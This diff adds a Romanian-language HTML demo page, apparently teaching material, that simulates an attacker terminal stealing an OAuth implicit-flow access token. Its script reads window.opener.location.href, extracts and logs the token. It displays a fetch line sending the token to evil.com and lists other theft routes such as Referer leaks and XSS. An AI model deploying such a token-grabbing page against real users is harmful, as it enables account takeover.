@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Atacator</title>
+  <style>
+    body {
+      font-family: 'Courier New', monospace;
+      background: #0d1117;
+      color: #c9d1d9;
+      margin: 0;
+      padding: 20px;
+      min-height: 100vh;
+    }
+    .terminal {
+      max-width: 800px;
+      margin: 0 auto;
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      overflow: hidden;
+    }
+    .terminal-header {
+      background: #21262d;
+      padding: 10px 16px;
+      border-bottom: 1px solid #30363d;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+    }
+    .dot-red { background: #ff5f56; }
+    .dot-yellow { background: #ffbd2e; }
+    .dot-green { background: #27c93f; }
+    .terminal-body {
+      padding: 20px;
+      font-size: 14px;
+      line-height: 1.8;
+    }
+    .prompt {
+      color: #ff7b72;
+      font-weight: bold;
+    }
+    .command {
+      color: #79c0ff;
+    }
+    .output {
+      color: #8b949e;
+      margin-left: 20px;
+    }
+    .success {
+      color: #3fb950;
+      font-weight: bold;
+    }
+    .error {
+      color: #ff7b72;
+    }
+    .stolen-token {
+      background: rgba(255, 123, 114, 0.1);
+      border: 1px solid #ff7b72;
+      border-radius: 4px;
+      padding: 15px;
+      margin: 15px 0;
+      word-break: break-all;
+    }
+    .warning {
+      background: rgba(187, 128, 9, 0.15);
+      border-left: 3px solid #d29922;
+      padding: 15px;
+      margin: 20px 0;
+      border-radius: 4px;
+    }
+    .line {
+      margin: 8px 0;
+      opacity: 0;
+      animation: fadeIn 0.5s forwards;
+    }
+    @keyframes fadeIn {
+      to { opacity: 1; }
+    }
+    .cursor {
+      display: inline-block;
+      width: 8px;
+      height: 16px;
+      background: #ff7b72;
+      animation: blink 1s step-end infinite;
+      margin-left: 4px;
+    }
+    @keyframes blink {
+      50% { opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+  <div class="terminal">
+    <div class="terminal-header">
+      <div class="dot dot-red"></div>
+      <div class="dot dot-yellow"></div>
+      <div class="dot dot-green"></div>
+      <span style="margin-left: 10px; font-size: 13px;">attacker@malicious:~</span>
+    </div>
+    <div class="terminal-body" id="output">
+      <div class="line" style="animation-delay: 0s;">
+        <span class="prompt">attacker@malicious:~$</span>
+        <span class="command"> // Script de furat token pornit...</span>
+      </div>
+      <div class="line" style="animation-delay: 0.3s;">
+        <span class="output">Încercăm să accesăm window.opener...</span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const outputDiv = document.getElementById('output');
+    let delay = 0.6;
+
+    function addLine(content, cssClass = '', delayTime = 0.3) {
+      const line = document.createElement('div');
+      line.className = 'line ' + cssClass;
+      line.style.animationDelay = delay + 's';
+      line.innerHTML = content;
+      outputDiv.appendChild(line);
+      delay += delayTime;
+    }
+    setTimeout(() => {
+     
+      if (window.opener && !window.opener.closed) {
+        addLine('<span class="success">✓ window.opener este accesibil!</span>');
+        addLine('<span class="prompt">attacker@malicious:~$</span> <span class="command">const victimUrl = window.opener.location.href;</span>');
+        
+        try {
+          
+          const victimUrl = window.opener.location.href;
+          addLine('<span class="output">URL victimă: ' + victimUrl + '</span>');
+          
+          
+          if (victimUrl.includes('#access_token=')) {
+            const hash = victimUrl.split('#')[1];
+            const params = new URLSearchParams(hash);
+            const stolenToken = params.get('access_token');
+            
+            addLine('<span class="success">TOKEN GĂSIT ȘI FURAT!</span>', '', 0.5);
+            addLine('<div class="stolen-token"><strong>Token furat:</strong><br>' + stolenToken + '</div>', '', 0.3);
+            
+            
+            addLine('<span class="prompt">attacker@malicious:~$</span> <span class="command">fetch("https://evil.com/steal", { method: "POST", body: token });</span>');
+            addLine('<span class="success">✓ Token trimis la serverul atacatorului!</span>', '', 0.5);
+            
+            addLine('<div class="warning"><strong>CE S-A ÎNTÂMPLAT:</strong><br><br>' +
+              '1. Atacatorul a deschis această pagină într-un tab nou<br>' +
+              '2. Prin <code>window.opener</code>, atacatorul are acces la tab-ul părinte<br>' +
+              '3. Atacatorul citește <code>window.opener.location.href</code><br>' +
+              '4. Tokenul din URL este extras și furat<br>' +
+              '5. Tokenul este trimis la serverul atacatorului<br><br>' +
+              '<strong>Utilizatorul nu știe că tokenul a fost furat!</strong></div>', '', 0.5);
+            
+            console.log('%cTOKEN FURAT', 'color: red; font-size: 20px; font-weight: bold;');
+            console.log('Token:', stolenToken);
+            console.log('URL complet:', victimUrl);
+            
+          } else {
+            addLine('<span class="error">✗ Nu s-a găsit access_token în URL</span>');
+            addLine('<span class="output">URL-ul victimă nu conține token în acest moment.</span>');
+            addLine('<span class="output">Asigură-te că ai apăsat "Aprob" în Authorization Server și că tokenul este în URL.</span>');
+          }
+          
+        } catch (error) {
+          addLine('<span class="error">✗ Acces blocat de Same-Origin Policy</span>');
+          addLine('<span class="output">Browser-ul blochează accesul cross-origin. Aceasta este o protecție, dar în alte scenarii (ex: tab-uri din același domeniu, extensii malițioase) atacul ar reuși.</span>');
+        }
+        
+      } else {
+        addLine('<span class="error">✗ window.opener nu este disponibil</span>');
+        addLine('<span class="output">Această pagină nu a fost deschisă dintr-un alt tab folosind window.open().</span>');
+        
+        addLine('<br><span class="prompt">attacker@malicious:~$</span> <span class="command">// Alte metode de a fura tokenul:</span>');
+        addLine('<span class="output">1. Browser History API - tokenul rămâne în istoric</span>', '', 0.2);
+        addLine('<span class="output">2. Referer Header - când navigezi de pe pagina cu token</span>', '', 0.2);
+        addLine('<span class="output">3. Extensii malițioase de browser</span>', '', 0.2);
+        addLine('<span class="output">4. XSS (Cross-Site Scripting) pe pagina client</span>', '', 0.2);
+        addLine('<span class="output">5. Proxy intermediare care logheză URL-uri</span>', '', 0.2);
+      }
+      
+      addLine('<br><span class="prompt">attacker@malicious:~$</span><span class="cursor"></span>', '', 0.5);
+      
+    }, 1000);
+  </script>
+</body>
+</html>
